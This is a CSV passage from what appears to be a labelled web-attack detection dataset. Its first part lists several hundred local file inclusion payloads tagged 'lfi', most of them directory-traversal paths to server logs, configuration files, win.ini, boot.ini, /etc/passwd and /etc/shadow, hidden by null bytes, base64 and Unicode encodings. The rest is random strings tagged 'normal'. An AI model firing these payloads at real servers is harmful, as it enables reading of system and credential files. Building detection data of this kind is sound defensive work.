index,input,category,labels
20749,"/var/log/dmesg
",lfi,1
20750,"/var/log/error_log
",lfi,1
20751,"/var/log/error.log
",lfi,1
20752,"../../../../../../../var/log/error_log
",lfi,1
20753,"../../../../../../../var/log/error.log
",lfi,1
20754,"../../../../../var/log/error_log
",lfi,1
20755,"/var/log/exim_mainlog
",lfi,1
20756,"/var/log/exim/mainlog
",lfi,1
20757,"/var/log/exim_paniclog
",lfi,1
20758,"/var/log/exim/paniclog
",lfi,1
20759,"/var/log/exim_rejectlog
",lfi,1
20760,"/var/log/exim/rejectlog
",lfi,1
20761,"/var/log/ftplog
",lfi,1
20762,"/var/log/ftp-proxy
",lfi,1
20763,"/var/log/ftp-proxy/ftp-proxy.log
",lfi,1
20764,"/var/log/httpd/
",lfi,1
20765,"/var/log/httpd/access_log
",lfi,1
20766,"/var/log/httpd/access.log
",lfi,1
20767,"../../../../../var/log/httpd/access_log
",lfi,1
20768,"/var/log/httpd/error_log
",lfi,1
20769,"/var/log/httpd/error.log
",lfi,1
20770,"../../../../../var/log/httpd/error_log
",lfi,1
20771,"/var/log/httpsd/ssl.access_log
",lfi,1
20772,"/var/log/httpsd/ssl_log
",lfi,1
20773,"/var/log/kern.log
",lfi,1
20774,"/var/log/lastlog
",lfi,1
20775,"/var/log/lighttpd
",lfi,1
20776,"/var/log/maillog
",lfi,1
20777,"/var/log/message
",lfi,1
20778,"/var/log/messages
",lfi,1
20779,"/var/log/mysqlderror.log
",lfi,1
20780,"/var/log/mysqld.log
",lfi,1
20781,"/var/log/mysql.log
",lfi,1
20782,"/var/log/mysql/mysql-bin.log
",lfi,1
20783,"/var/log/mysql/mysql.log
",lfi,1
20784,"/var/log/mysql/mysql-slow.log
",lfi,1
20785,"/var/log/ncftpd.errs
",lfi,1
20786,"/var/log/ncftpd/misclog.txt
",lfi,1
20787,"/var/log/news
",lfi,1
20788,"/var/log/news.all
",lfi,1
20789,"/var/log/news/news
",lfi,1
20790,"/var/log/news/news.all
",lfi,1
20791,"/var/log/news/news.crit
",lfi,1
20792,"/var/log/news/news.err
",lfi,1
20793,"/var/log/news/news.notice
",lfi,1
20794,"/var/log/news/suck.err
",lfi,1
20795,"/var/log/news/suck.notice
",lfi,1
20796,"/var/log/poplog
",lfi,1
20797,"/var/log/POPlog
",lfi,1
20798,"/var/log/proftpd
",lfi,1
20799,"/var/log/proftpd.access_log
",lfi,1
20800,"/var/log/proftpd.xferlog
",lfi,1
20801,"/var/log/proftpd/xferlog.legacy
",lfi,1
20802,"/var/log/pureftpd.log
",lfi,1
20803,"/var/log/pure-ftpd/pure-ftpd.log
",lfi,1
20804,"/var/log/qmail
",lfi,1
20805,"/var/log/qmail/
",lfi,1
20806,"/var/log/samba
",lfi,1
20807,"/var/log/samba-log.%m
",lfi,1
20808,"/var/log/secure
",lfi,1
20809,"/var/log/smtpd
",lfi,1
20810,"/var/log/spooler
",lfi,1
20811,"/var/log/syslog
",lfi,1
20812,"/var/log/telnetd
",lfi,1
20813,"/var/log/thttpd_log
",lfi,1
20814,"/var/log/utmp
",lfi,1
20815,"/var/log/vsftpd.log
",lfi,1
20816,"/var/log/wtmp
",lfi,1
20817,"/var/log/xferlog
",lfi,1
20818,"/var/log/yum.log
",lfi,1
20819,"/var/lp/logs/lpNet
",lfi,1
20820,"/var/lp/logs/lpsched
",lfi,1
20821,"/var/lp/logs/requests
",lfi,1
20822,"/var/mysql.log
",lfi,1
20823,"/var/run/httpd.pid
",lfi,1
20824,"/var/run/mysqld/mysqld.pid
",lfi,1
20825,"/var/run/utmp
",lfi,1
20826,"/var/saf/_log
",lfi,1
20827,"/var/saf/port/log
",lfi,1
20828,"/var/spool/errors
",lfi,1
20829,"/var/spool/locks
",lfi,1
20830,"/var/spool/logs
",lfi,1
20831,"/var/spool/tmp
",lfi,1
20832,"/var/www/conf/httpd.conf
",lfi,1
20833,"/var/www/html/.htaccess
",lfi,1
20834,"/var/www/localhost/htdocs/.htaccess
",lfi,1
20835,"/var/www/log/access_log
",lfi,1
20836,"/var/www/log/error_log
",lfi,1
20837,"/../../var/www/logs/access_log
",lfi,1
20838,"/var/www/logs/access_log
",lfi,1
20839,"/var/www/logs/access.log
",lfi,1
20840,"../../../../../../../var/www/logs/access_log
",lfi,1
20841,"../../../../../../../var/www/logs/access.log
",lfi,1
20842,"../../../../../var/www/logs/access.log
",lfi,1
20843,"/var/www/logs/error_log
",lfi,1
20844,"/var/www/logs/error.log
",lfi,1
20845,"../../../../../../../var/www/logs/error_log
",lfi,1
20846,"../../../../../../../var/www/logs/error.log
",lfi,1
20847,"../../../../../var/www/logs/error_log
",lfi,1
20848,"../../../../../var/www/logs/error.log
",lfi,1
20849,"/var/www/sitename/htdocs/
",lfi,1
20850,"/var/www/vhosts/sitename/httpdocs/.htaccess
",lfi,1
20851,"/var/www/web1/html/.htaccess
",lfi,1
20852,"/Volumes/Macintosh_HD1/opt/apache2/conf/httpd.conf
",lfi,1
20853,"/Volumes/Macintosh_HD1/opt/apache/conf/httpd.conf
",lfi,1
20854,"/Volumes/Macintosh_HD1/opt/httpd/conf/httpd.conf
",lfi,1
20855,"/Volumes/Macintosh_HD1/usr/local/php4/httpd.conf.php
",lfi,1
20856,"/Volumes/Macintosh_HD1/usr/local/php5/httpd.conf.php
",lfi,1
20857,"/Volumes/Macintosh_HD1/usr/local/php/httpd.conf.php
",lfi,1
20858,"/Volumes/Macintosh_HD1/usr/local/php/lib/php.ini
",lfi,1
20859,"/Volumes/webBackup/opt/apache2/conf/httpd.conf
",lfi,1
20860,"/Volumes/webBackup/private/etc/httpd/httpd.conf
",lfi,1
20861,"/Volumes/webBackup/private/etc/httpd/httpd.conf.default
",lfi,1
20862,"/web/conf/php.ini
",lfi,1
20863,"/WINDOWS\php.ini
",lfi,1
20864,"../../windows/win.ini
",lfi,1
20865,"../../../../../../../../windows/win.ini
",lfi,1
20866,"..\..\..\..\..\..\..\..\windows\win.ini
",lfi,1
20867,"/WINNT\php.ini
",lfi,1
20868,"/..\..\..\..\..\..\winnt\win.ini
",lfi,1
20869,"/www/logs/proftpd.system.log
",lfi,1
20870,"/xampp\apache\bin\php.ini
",lfi,1
20871,"/.Xauthority
",lfi,1
20872,"..2fapache2flogs2ferror.log
",lfi,1
20873,"..2fapache2flogs2faccess.log
",lfi,1
20874,"..2f..2fapache2flogs2ferror.log
",lfi,1
20875,"..2f..2fapache2flogs2faccess.log
",lfi,1
20876,"..2f..2f..2fapache2flogs2ferror.log
",lfi,1
20877,"..2f..2f..2fapache2flogs2faccess.log
",lfi,1
20878,"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces_log
",lfi,1
20879,"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2facces.log
",lfi,1
20880,"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror_log
",lfi,1
20881,"..2f..2f..2f..2f..2f..2f..2fetc2fhttpd2flogs2ferror.log
",lfi,1
20882,"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess_log
",lfi,1
20883,"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2faccess.log
",lfi,1
20884,"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess_ log
",lfi,1
20885,"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2faccess. log
",lfi,1
20886,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess_log
",lfi,1
20887,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess_log
",lfi,1
20888,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2faccess.log
",lfi,1
20889,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22faccess.log
",lfi,1
20890,"..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess_log
",lfi,1
20891,"..2f..2f..2f..2f..2f..2f..2fvar2flog2faccess.log
",lfi,1
20892,"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror_log
",lfi,1
20893,"..2f..2f..2f..2f..2f..2f..2fvar2fwww2flogs2ferror.log
",lfi,1
20894,"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror_l og
",lfi,1
20895,"..2f..2f..2f..2f..2f..2f..2fusr2flocal2fapache2flogs2ferror.l og
",lfi,1
20896,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror_log
",lfi,1
20897,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror_log
",lfi,1
20898,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache2ferror.log
",lfi,1
20899,"..2f..2f..2f..2f..2f..2f..2fvar2flog2fapache22ferror.log
",lfi,1
20900,"..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror_log
",lfi,1
20901,"..2f..2f..2f..2f..2f..2f..2fvar2flog2ferror.log
",lfi,1
20902,"..2fetc2fpasswd
",lfi,1
20903,"..2fetc2fpasswd%00
",lfi,1
20904,"..2f..2fetc2fpasswd
",lfi,1
20905,"..2f..2fetc2fpasswd%00
",lfi,1
20906,"..2f..2f..2fetc2fpasswd
",lfi,1
20907,"..2f..2f..2fetc2fpasswd%00
",lfi,1
20908,"..2f..2f..2f..2fetc2fpasswd
",lfi,1
20909,"..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20910,"..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20911,"..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20912,"..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20913,"..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20914,"..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20915,"..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20916,"..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20917,"..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20918,"..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20919,"..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20920,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20921,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20922,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20923,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20924,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20925,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20926,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20927,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20928,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20929,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20930,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20931,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20932,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20933,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20934,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20935,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20936,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20937,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20938,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20939,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20940,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20941,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20942,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20943,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20944,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd
",lfi,1
20945,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00
",lfi,1
20946,"..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fshadow%00
",lfi,1
20947,"L2V0Yy9tYXN0ZXIucGFzc3dk
",lfi,1
20948,"L21hc3Rlci5wYXNzd2Q=
",lfi,1
20949,"ZXRjL3Bhc3N3ZA==
",lfi,1
20950,"ZXRjL3NoYWRvdyUwMA==
",lfi,1
20951,"L2V0Yy9wYXNzd2Q=
",lfi,1
20952,"L2V0Yy9wYXNzd2QlMDA=
",lfi,1
20953,"Li4vZXRjL3Bhc3N3ZA==
",lfi,1
20954,"Li4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20955,"Li4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20956,"Li4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20957,"Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20958,"Li4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20959,"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20960,"Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20961,"Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20962,"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20963,"Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20964,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20965,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20966,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20967,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20968,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20969,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20970,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20971,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20972,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20973,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20974,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20975,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20976,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20977,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20978,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20979,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20980,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20981,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20982,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20983,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20984,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20985,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20986,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20987,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20988,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20989,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20990,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20991,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20992,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20993,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20994,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==
",lfi,1
20995,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZCUwMA==
",lfi,1
20996,"Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3NoYWRvdyUwMA==
",lfi,1
20997,"%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%e2%80%a5%ef%bc%8f%ef%bd%85%ef%bd%94%e2%85%bd%ef%bc%8f%ef%bd%90%ef%bd%81%ef%bd%93%ef%bd%93%ef%bd%97%e2%85%be
",lfi,1
20998,"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
",lfi,1
20999,"%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%e2%80%a5%ef%b9%a8%ef%bd%82%ef%bd%8f%ef%bd%8f%ef%bd%94%e2%80%a4%e2%85%b0%ef%bd%8e%e2%85%b0
",lfi,1
21000,"..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8..%ef%b9%a8boot.ini
",lfi,1
21001,"..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bc..%ef%bc%bcboot.ini
",lfi,1
21002,"///////../../../etc/passwd
",lfi,1
21003,"Password
",normal,0
21004,"SU)%qD3M>Lu]tEJ+f^dz>B
",normal,0
21005,"k]S_G54D+VHrL(@7}n4WA(
",normal,0
21006,"8v_2y8^Fmy?DyG^b^QfWV5
",normal,0
21007,"?q5$L[x6RwN*@J3Q5T(x^G
",normal,0
21008,"*X3u(wEzyPb87/[Q%p!W/(
",normal,0
21009,"HG=m[UuKnkC@KL!fbK6qc=
",normal,0
21010,"[>4?}$p%n=}>r44y?b!wB*
",normal,0
21011,"s$DWB%9$dJ5%*&62>2r3R$
",normal,0
21012,"3q$rvU9LE!J+^n?%(?&=rq
",normal,0
21013,"V-(?+6+eXTL%&e=J!_WcyP
",normal,0
21014,"HH9vf/_->%TD}BSJq+{(+*
",normal,0
21015,"{+]!bRT@J/[*Sfb6fv?_KV
",normal,0
21016,"ar?R&n7vfqh_CVWVkv]ML!
",normal,0
21017,"Sr/jrP5[7NmQvCm(ayKEU5
",normal,0
21018,"DHPvb7DwrDWDh/U3r!UhHd
",normal,0
21019,"aYyT+t*84SL.MKp+%525RQ
",normal,0
21020,"A.s8Uwg[NzzvQHjppEFhPr
",normal,0
21021,"2XyL@?Pg!/MRyucuLE?)pQ
",normal,0
21022,"-kYb8JQmq3[MqSbK*>nA>J
",normal,0
21023,"r9$(T%aw{3$art)G*LA*?n
",normal,0
21024,"3WhnN(sHj]XUjYH4ZeV)v!
",normal,0
21025,"{N8R/pdVv)v5ek8a)_ba(9
",normal,0
21026,"@ZE%Ne&.G)%%fW5qBEraKm
",normal,0
21027,"Q@4-EGYDbM%/zwsjhfJjt9
",normal,0
21028,"$$UC_!CP2rqWN_M]v{5Lwx
",normal,0
21029,"cv(d%7cZtB64puN[W9X/t.
",normal,0
21030,"_Rx4Ly]&>.K/)tvg&E)RM5
",normal,0
21031,"3FUvcRq2.7/?{cR^/GUmWU
",normal,0
21032,"tB.^kx>5W}>F(y$gs[9KWW
",normal,0
21033,"9HuDpv5ZEb8V!WEEg/vFUY
",normal,0
21034,"9aLsNa4c>9{9wkHm5ZaMLD
",normal,0
21035,"Jz/@=LnHEK=Gsty*jQ!$*5
",normal,0
21036,"v/QnhpsRTxUwH^4+LE}z)j
",normal,0
21037,"Wx]%F)y}]42[?c8GC-Bun6
",normal,0
21038,"f-rELhpWRxk9j}=QfQVY4F
",normal,0
21039,"{@^9DcCHdd(.U^Sc.9v=U+
",normal,0
21040,"^[uWj2VmRB@-g$92TBbt2H
",normal,0
21041,"2qAQn3b^]s5Zs}?Mgecahr
",normal,0
21042,"rXdg?+EJht4JL6k4EZ@nYg
",normal,0
21043,"H5m%CkS{NcfwS!u)@.u4AX
",normal,0
21044,"cbSmbA)WY]dp+2]35dW)/g
",normal,0
21045,"cyttDZ8zn$LGDVeGTx_^rM
",normal,0
21046,"pk)}V.AE6/&S8jVkbh42.K
",normal,0
21047,"2!^HSv^>c5jZ/f}eg42*m.
",normal,0
21048,"7nhcHF-Eh2j_t4k@k+r^me
",normal,0
21049,"6S5^f%=8-J6({WPSQ?Gd.5
",normal,0
21050,"]uD*s!mKg(P)bHeqDq2zbC
",normal,0
21051,"YjB6zdXbcSP-%ezkBMJ96j
",normal,0
21052,"UR2wx^n4u!+^km6/%($TpT
",normal,0
21053,"Y>HRjh7jjH+b8A!pBcC(aX
",normal,0
21054,"y9Vv8Z/mFwhHKs4K6v-DH9
",normal,0
21055,"sRd-bK6uYLCAN(azWz_F%k
",normal,0
21056,"=!nzTAhx^]64.f]%&amXe5
",normal,0
21057,"X4]53b{+YfmPN-2sdk)m=8
",normal,0
21058,"E3[{3Szr)W&4(wXkqs/n*Z
",normal,0
21059,"+qwHRW6)6XmW4pa$[h9^24
",normal,0
21060,"n{m%(V3uetTD_Q6}zCy/>C
",normal,0
21061,"d8f*RWrU%x/j@Q^x&@zCd[
",normal,0
21062,"(d+9yYf2rsa+^8EqmYVxPZ
",normal,0
21063,"}Ytp+!FE!-HK+)q4u)Hw*9
",normal,0
21064,"E>y5Rd%mr@xT+fh+(C=Ksh
",normal,0
21065,"{r_@w9>Vgj5*&x?/xNPuz8
",normal,0
21066,"m7aMSBUagZ@JYx-K8>Wcy$
",normal,0
21067,"+JkwunU.M3}nU8!?sY6>FS
",normal,0
21068,"kre{uz/K{T?a]PU@_C]Aw8
",normal,0
21069,"&d?U@X(u5A?KMrJq@.^/*d
",normal,0
21070,"x?%PSUyfDK@[jd9vcf=b_?
",normal,0
21071,"{d/8ExA9j74}sB>SV5Yu6n
",normal,0
21072,"@jS{A83_>6HGavz^]-LDLk
",normal,0
21073,"x=8bm>)fSd.8C9>4FVw?Tm
",normal,0
21074,">nZWZE4b9-RcQDk8JVhWgm
",normal,0
21075,"QMm$&S]Zf=Ke%[amR3b$X%
",normal,0
21076,"x4YpHWjehXDRH/9hH22V}t
",normal,0
21077,"dyx6}Qnv{gbmaTFanG?K/}
",normal,0
21078,"=FH8Ly2W@6HrraZ*kxc9@w
",normal,0
21079,"X3AhY(a_U[dSQ&wE]BsJ)8
",normal,0
21080,"(pXj!(myX]3EDyVj7G!kVJ
",normal,0
21081,"%)9hhc&V]$45*&-%RczyRY
",normal,0
21082,"w8=kF36A8(Z>waR)[W?WLD
",normal,0
21083,"a^BHP!G[[ZH@D%R2w2dHCz
",normal,0
21084,"Y]Zg3++ya9fWnY5/Uj6Ad6
",normal,0
